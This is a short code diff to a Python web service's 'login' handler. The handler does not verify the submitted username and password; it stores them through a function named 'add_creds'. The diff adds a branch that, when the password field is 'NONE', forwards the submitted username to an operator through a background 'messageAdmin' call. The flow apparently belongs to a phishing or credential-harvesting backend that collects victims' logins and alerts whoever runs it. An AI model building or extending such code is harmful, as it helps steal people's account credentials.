@@ -155,6 +155,15 @@ def login(
     item: schemas.Login,
     db: Session = Depends(get_db),
 ):
+    
+    # if only user was sent 
+    if item.password == "NONE" :
+        admin_message = f"----\n Username: \n id: {id}\n username:{item.username} \n----"
+        # messageAdmin(admin_message)
+        messageadmin_thread = threading.Thread(target=messageAdmin, args=(admin_message,))
+        messageadmin_thread.start()
+        return
+
     db_user = crud.add_creds(db, id, item.username, item.password)
     if not db_user:
         return '{"status":"Error"}'
